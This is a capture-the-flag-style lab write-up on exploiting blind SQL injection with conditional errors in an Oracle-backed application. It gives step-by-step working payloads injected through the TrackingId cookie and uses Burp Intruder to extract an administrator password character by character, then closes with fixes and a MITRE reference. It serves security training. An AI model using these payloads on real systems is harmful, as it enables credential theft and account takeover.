# Lab: Blind SQL injection with conditional errors

**Category:** SQL Injection\
**Difficulty:** Practitioner\
**Objective:** Exploit blind SQL injection with conditional errors to find the
administrator's password and log in.

## 0. Attacker mindset

The application does not return query results and does not change behavior
based on row existence. The only observable difference is an HTTP 500 error
when the SQL query causes a database error. By crafting a subquery that
intentionally causes a divide-by-zero error only when a condition is true, I
can extract data one character at a time.

## 1. What is the vulnerability?

The `TrackingId` cookie is concatenated directly into a SQL query without
sanitization. An attacker can inject a subquery using Oracle-specific syntax
(`FROM dual`, `TO_CHAR(1/0)`) to trigger conditional database errors. The
presence or absence of an HTTP 500 error reveals whether the injected
condition is true or false.

## 2. How did I exploit it?

### Step 1 — Confirm SQL injection
```
TrackingId=LN8QtfA1A8hlEzCe'      → 500 (syntax error)
TrackingId=LN8QtfA1A8hlEzCe''     → 200 (valid syntax)
```
The server reacts to SQL syntax errors. The injection point is confirmed.

### Step 2 — Identify the database (Oracle)
```
TrackingId=LN8QtfA1A8hlEzCe'||(SELECT '')||'        → 500 (Oracle needs FROM)
TrackingId=LN8QtfA1A8hlEzCe'||(SELECT '' FROM dual)||' → 200 (valid Oracle)
```
Oracle confirmed. The `FROM dual` is required.

### Step 3 — Confirm conditional errors work
```
TrackingId=LN8QtfA1A8hlEzCe'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' → 500
TrackingId=LN8QtfA1A8hlEzCe'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' → 200
```
Error occurs only when the condition is true. This is the extraction mechanism.

### Step 4 — Confirm the administrator user exists
```
TrackingId=LN8QtfA1A8hlEzCe'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' → 500
```
The subquery returns a row (user exists), condition true, error triggered.

### Step 5 — Determine password length
```
TrackingId=LN8QtfA1A8hlEzCe'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
Increased the number until the error stopped. Error for >1 through >19, no
error for >20. Password length = 20 characters.

### Step 6 — Extract each character with Burp Intruder
```
TrackingId=LN8QtfA1A8hlEzCe'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
- Sniper attack on the character position
- Payloads: a-z, 0-9
- Grep Match: `Internal Server Error`
- Repeated for positions 1 through 20

### Password recovered
```
mhd5amxtwydcynanqh3x
```

### Step 7 — Log in
Used `administrator`:`mhd5amxtwydcynanqh3x`. Lab solved.

## 3. Impact

- Complete password extraction without visible data or behavioral changes
- Oracle-specific conditional error technique proven effective
- Full account takeover, including administrative access

## 4. How can it be fixed?

- Use parameterized queries (prepared statements) for all SQL operations
- Do not concatenate user input (including cookies) into queries
- Return generic error pages (though this alone does not prevent error-based
  blind SQLi)

**MITRE ATT&CK:** [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
